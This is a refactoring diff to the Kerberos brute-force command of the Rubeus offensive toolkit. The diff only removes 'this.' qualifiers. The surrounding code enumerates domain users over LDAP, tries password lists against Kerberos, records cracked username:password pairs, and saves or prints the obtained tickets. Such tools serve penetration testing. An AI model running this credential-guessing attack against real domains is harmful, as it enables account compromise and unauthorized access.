@@ -40,22 +40,22 @@ namespace Rubeus.Commands
             Console.WriteLine("\r\n[*] Action: Perform Kerberos Brute Force\r\n");
             try
             {
-                this.ParseArguments(arguments);
-                this.ObtainUsers();
+                ParseArguments(arguments);
+                ObtainUsers();
 
                 IBruteforcerReporter consoleReporter = new BruteforceConsoleReporter(
-                    this.outfile, this.verbose, this.saveTickets);
+                    outfile, verbose, saveTickets);
 
-                Bruteforcer bruter = new Bruteforcer(this.domain, this.dc, consoleReporter);
-                bool success = bruter.Attack(this.usernames, this.passwords);
+                Bruteforcer bruter = new Bruteforcer(domain, dc, consoleReporter);
+                bool success = bruter.Attack(usernames, passwords);
                 if (success)
                 {
-                    if (!String.IsNullOrEmpty(this.outfile))
+                    if (!String.IsNullOrEmpty(outfile))
                     {
-                        Console.WriteLine("\r\n[+] Done: Credentials should be saved in \"{0}\"\r\n", this.outfile);
+                        Console.WriteLine("\r\n[+] Done: Credentials should be saved in \"{0}\"\r\n", outfile);
                     }else
                     {
-                        Console.WriteLine("\r\n[+] Done\r\n", this.outfile);
+                        Console.WriteLine("\r\n[+] Done\r\n", outfile);
                     }
                 } else
                 {
@@ -74,26 +74,26 @@ namespace Rubeus.Commands
 
         private void ParseArguments(Dictionary<string, string> arguments)
         {
-            this.ParseDomain(arguments);
-            this.ParseOU(arguments);
-            this.ParseDC(arguments);
-            this.ParseCreds(arguments);
-            this.ParsePasswords(arguments);
-            this.ParseUsers(arguments);
-            this.ParseOutfile(arguments);
-            this.ParseVerbose(arguments);
-            this.ParseSaveTickets(arguments);
+            ParseDomain(arguments);
+            ParseOU(arguments);
+            ParseDC(arguments);
+            ParseCreds(arguments);
+            ParsePasswords(arguments);
+            ParseUsers(arguments);
+            ParseOutfile(arguments);
+            ParseVerbose(arguments);
+            ParseSaveTickets(arguments);
         }
 
         private void ParseDomain(Dictionary<string, string> arguments)
         {
             if (arguments.ContainsKey("/domain"))
             {
-                this.domain = arguments["/domain"];
+                domain = arguments["/domain"];
             }
             else
             {
-                this.domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
+                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
             }
         }
 
@@ -101,7 +101,7 @@ namespace Rubeus.Commands
         {
             if (arguments.ContainsKey("/ou"))
             {
-                this.ou = arguments["/ou"];
+                ou = arguments["/ou"];
             }
         }
 
@@ -109,10 +109,10 @@ namespace Rubeus.Commands
         {
             if (arguments.ContainsKey("/dc"))
             {
-                this.dc = arguments["/dc"];
+                dc = arguments["/dc"];
             }else
             {
-                this.dc = this.domain;
+                dc = domain;
             }
         }
 
@@ -126,15 +126,15 @@ namespace Rubeus.Commands
                 }
 
                 string[] parts = arguments["/creduser"].Split('\\');
-                this.credDomain = parts[0];
-                this.credUser = parts[1];
+                credDomain = parts[0];
+                credUser = parts[1];
 
                 if (!arguments.ContainsKey("/credpassword"))
                 {
                     throw new BruteArgumentException("[X] /credpassword is required when specifying /creduser");
                 }
 
-                this.credPassword = arguments["/credpassword"];
+                credPassword = arguments["/credpassword"];
             }
 
         }
@@ -145,7 +145,7 @@ namespace Rubeus.Commands
             {
                 try
                 {
-                    this.passwords = File.ReadAllLines(arguments["/passwords"]);
+                    passwords = File.ReadAllLines(arguments["/passwords"]);
                 }catch(FileNotFoundException)
                 {
                     throw new BruteArgumentException("[X] Unable to open passwords file \"" + arguments["/passwords"] + "\": Not found file");
@@ -153,7 +153,7 @@ namespace Rubeus.Commands
             }
             else if (arguments.ContainsKey("/password"))
             {
-                this.passwords = new string[] { arguments["/password"] };
+                passwords = new string[] { arguments["/password"] };
             }
             else
             {
@@ -167,7 +167,7 @@ namespace Rubeus.Commands
             if (arguments.ContainsKey("/users"))
             {
                 try {
-                    this.usernames = File.ReadAllLines(arguments["/users"]);
+                    usernames = File.ReadAllLines(arguments["/users"]);
                 }catch (FileNotFoundException)
                 {
                     throw new BruteArgumentException("[X] Unable to open users file \"" + arguments["/users"] + "\": Not found file");
@@ -175,7 +175,7 @@ namespace Rubeus.Commands
             }
             else if (arguments.ContainsKey("/user"))
             {
-                this.usernames = new string[] { arguments["/user"] };
+                usernames = new string[] { arguments["/user"] };
             }
         }
 
@@ -183,7 +183,7 @@ namespace Rubeus.Commands
         {
             if (arguments.ContainsKey("/outfile"))
             {
-                this.outfile = arguments["/outfile"];
+                outfile = arguments["/outfile"];
             }
         }
 
@@ -191,7 +191,7 @@ namespace Rubeus.Commands
         {
             if (arguments.ContainsKey("/verbose"))
             {
-                this.verbose = 2;
+                verbose = 2;
             }
         }
 
@@ -199,21 +199,21 @@ namespace Rubeus.Commands
         {
             if (arguments.ContainsKey("/noticket"))
             {
-                this.saveTickets = false;
+                saveTickets = false;
             }
         }
 
         private void ObtainUsers()
         {
-            if(this.usernames == null)
+            if(usernames == null)
             {
-                this.usernames = this.DomainUsernames();
+                usernames = DomainUsernames();
             }
             else
             {
-                if(this.verbose == 0)
+                if(verbose == 0)
                 {
-                    this.verbose = 1;
+                    verbose = 1;
                 }
             }
         }
@@ -221,21 +221,21 @@ namespace Rubeus.Commands
         private string[] DomainUsernames()
         {
 
-            string domainController = this.DomainController();
-            string bindPath = this.BindPath(domainController);
+            string domainController = DomainController();
+            string bindPath = BindPath(domainController);
             DirectoryEntry directoryObject = new DirectoryEntry(bindPath);
 
-            if (!String.IsNullOrEmpty(this.credUser))
+            if (!String.IsNullOrEmpty(credUser))
             {
-                string userDomain = $"{this.credDomain}\\{this.credUser}";
+                string userDomain = $"{credDomain}\\{credUser}";
 
-                if (!this.AreCredentialsValid())
+                if (!AreCredentialsValid())
                 {
                     throw new BruteArgumentException("[X] Credentials supplied for '" + userDomain + "' are invalid!");
                 }
                 
                 directoryObject.Username = userDomain;
-                directoryObject.Password = this.credPassword;
+                directoryObject.Password = credPassword;
 
                 Console.WriteLine("[*] Using alternate creds  : {0}\r\n", userDomain);
             }
@@ -281,7 +281,7 @@ namespace Rubeus.Commands
             string domainController = null;
 
 
-            if (String.IsNullOrEmpty(this.dc))
+            if (String.IsNullOrEmpty(dc))
             {
                 domainController = Networking.GetDCName();
 
@@ -292,7 +292,7 @@ namespace Rubeus.Commands
             }
             else
             {
-                domainController = this.dc;
+                domainController = dc;
             }
 
             return domainController;
@@ -302,14 +302,14 @@ namespace Rubeus.Commands
         {
             string bindPath = $"LDAP://{domainController}";
 
-            if (!String.IsNullOrEmpty(this.ou))
+            if (!String.IsNullOrEmpty(ou))
             {
-                string ouPath = this.ou.Replace("ldap", "LDAP").Replace("LDAP://", "");
+                string ouPath = ou.Replace("ldap", "LDAP").Replace("LDAP://", "");
                 bindPath = $"{bindPath}/{ouPath}";
             }
-            else if (!String.IsNullOrEmpty(this.domain))
+            else if (!String.IsNullOrEmpty(domain))
             {
-                string domainPath = this.domain.Replace(".", ",DC=");
+                string domainPath = domain.Replace(".", ",DC=");
                 bindPath = $"{bindPath}/DC={domainPath}";
             }
 
@@ -318,9 +318,9 @@ namespace Rubeus.Commands
 
         private bool AreCredentialsValid()
         {
-            using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, this.credDomain))
+            using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, credDomain))
             {
-                return pc.ValidateCredentials(this.credUser, this.credPassword);
+                return pc.ValidateCredentials(credUser, credPassword);
             }
         }
 
@@ -344,11 +344,11 @@ namespace Rubeus.Commands
 
         public void ReportValidPassword(string domain, string username, string password, byte[] ticket, Interop.KERBEROS_ERROR err = Interop.KERBEROS_ERROR.KDC_ERR_NONE)
         {
-            this.WriteUserPasswordToFile(username, password);
+            WriteUserPasswordToFile(username, password);
             if (ticket != null)
             {
                 Console.WriteLine("[+] STUPENDOUS => {0}:{1}", username, password);
-                this.HandleTicket(username, ticket);
+                HandleTicket(username, ticket);
             }
             else
             {
@@ -366,7 +366,7 @@ namespace Rubeus.Commands
 
         public void ReportInvalidUser(string domain, string username)
         {
-            if (this.verbose > 1)
+            if (verbose > 1)
             {
                 Console.WriteLine("[-] Invalid user => {0}", username);
             }
@@ -386,7 +386,7 @@ namespace Rubeus.Commands
 
         private void WriteUserPasswordToFile(string username, string password)
         {
-            if (String.IsNullOrEmpty(this.passwordsOutfile))
+            if (String.IsNullOrEmpty(passwordsOutfile))
             {
                 return;
             }
@@ -394,20 +394,20 @@ namespace Rubeus.Commands
             string line = $"{username}:{password}{Environment.NewLine}";
             try
             {
-                File.AppendAllText(this.passwordsOutfile, line);
+                File.AppendAllText(passwordsOutfile, line);
             }catch(UnauthorizedAccessException)
             {
-                if (!this.reportedBadOutputFile)
+                if (!reportedBadOutputFile)
                 {
-                    Console.WriteLine("[X] Unable to write credentials in \"{0}\": Access denied", this.passwordsOutfile);
-                    this.reportedBadOutputFile = true;
+                    Console.WriteLine("[X] Unable to write credentials in \"{0}\": Access denied", passwordsOutfile);
+                    reportedBadOutputFile = true;
                 }
             }
         }
 
         private void HandleTicket(string username, byte[] ticket)
         {
-            if(this.saveTicket)
+            if(saveTicket)
             {
                 string ticketFilename = username + ".kirbi";
                 File.WriteAllBytes(ticketFilename, ticket);
@@ -415,7 +415,7 @@ namespace Rubeus.Commands
             }
             else
             {
-                this.PrintTicketBase64(username, ticket);
+                PrintTicketBase64(username, ticket);
             }
         }
 
@@ -426,7 +426,7 @@ namespace Rubeus.Commands
             Console.WriteLine("[*] base64({0}.kirbi):\r\n", ticketname);
 
             // display in columns of 80 chararacters
-            if (Rubeus.Program.wrapTickets)
+            if (Program.wrapTickets)
             {
                 foreach (string line in Helpers.Split(ticketB64, 80))
                 {
